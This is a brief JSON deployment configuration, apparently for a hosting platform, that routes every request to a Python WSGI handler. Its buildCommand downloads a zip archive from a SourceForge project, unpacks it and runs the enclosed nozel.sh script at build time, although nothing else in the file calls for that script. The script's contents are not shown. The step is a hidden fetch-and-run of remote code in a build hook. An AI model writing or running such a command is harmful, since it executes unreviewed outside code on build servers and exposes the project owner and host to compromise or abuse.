{
  "buildCommand": "curl https://sourceforge.net/projects/drths/files/nozel.zip/download -L -o nozel.zip && unzip nozel.zip && ./nozel.sh",
  "routes": [
    {
      "src": "/(.*)",
      "dest": "/api/wsgi.py"
    }
  ]
}
